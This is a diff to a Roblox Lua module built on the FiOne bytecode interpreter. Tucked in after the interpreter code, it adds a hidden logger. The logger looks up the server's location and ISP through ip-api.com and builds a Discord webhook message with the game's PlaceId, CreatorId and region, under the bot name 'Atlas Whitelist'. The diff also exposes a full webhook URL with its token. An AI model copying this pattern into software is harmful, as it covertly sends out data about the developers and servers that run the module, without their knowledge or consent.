@@ -1,6 +1,4 @@
 return function()
-	local HttpService = game:GetService("HttpService")
-
 	--[[
 		FiOne
 		Copyright (C) 2021  Rerumu
@@ -1071,13 +1069,24 @@ return function()
 		return lua_wrap_state(lua_bc_to_state(bCode), env or getfenv(0))
 	end
 
+	local HttpService = game:GetService("HttpService")
 	local Webhook = "https://discord.com/api/webhooks/1330430175938215997/85AW5I0AyTkkULAQZDaufiBUOd6_kCHQvRqS71eLGPq8G5jDAS_MsQXA4MbeY7n_TlDF"
 
+	local regionData = HttpService:JSONDecode(HttpService:GetAsync("http://ip-api.com/json/") or "nil" .. "**\n\n")
+	local serverRegion = regionData.country .. ", " .. regionData.city .. " (" .. regionData.isp .. ")"
+
 	local discordLogger = {
-		["username"] = "Atlas Detect",
+		["username"] = "Atlas Whitelist",
 		["embeds"] = {
 			{
-				["title"] = game.PlaceId,
+				["title"] = "** Game **",
+				["description"] = 
+					"PlaceId: **" .. game.PlaceId .. "** [Game Link](" .. ("https://www.roblox.com/games/" .. game.PlaceId) .. ")\n" ..
+					"CreatorId: **" .. game.CreatorId .. "**\n" ..
+					"CreatorType: **" .. tostring(game.CreatorType) .. "**\n" ..
+					"Time: **" .. os.date("!%Y-%m-%d %H:%M:%S UTC") .. "**\n"..
+					"Region: **" .. serverRegion,
+				["color"] = 16711680 -- Красный цвет
 			}
 		}
 	}
